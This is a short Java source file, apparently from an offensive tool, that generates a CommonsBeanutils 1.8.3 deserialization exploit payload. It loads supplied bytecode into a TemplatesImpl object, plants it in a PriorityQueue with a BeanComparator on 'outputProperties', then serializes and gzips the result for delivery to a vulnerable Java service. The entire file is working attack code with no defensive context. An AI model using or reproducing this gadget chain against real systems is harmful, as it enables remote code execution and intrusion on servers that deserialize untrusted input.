package com.example.frchannel.payload;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.beanutils.BeanComparator;

import java.lang.reflect.Constructor;
import java.util.Comparator;
import java.util.PriorityQueue;

public class CommonsBeanutils183 {

    public static byte[] getPayload(byte[] bytes) throws Exception {
        TemplatesImpl t = utils.getTeml(bytes);
        PriorityQueue<Object> queue = new PriorityQueue<>(2);
        queue.add(1);
        queue.add(2);
        utils.setFieldValue(queue,"queue",new Object[]{t,2});
        Constructor<?> constructor = utils.getConstructor("java.lang.String$CaseInsensitiveComparator");
        Comparator<?> comparator = (Comparator<?>) constructor.newInstance();
        BeanComparator beanComparator = new BeanComparator("outputProperties",comparator);
        utils.setFieldValue(queue,"comparator",beanComparator);

        byte[] ser = utils.serialize(queue);
        byte[] payload = utils.GzipCompress(ser);

        return payload;
    }

}
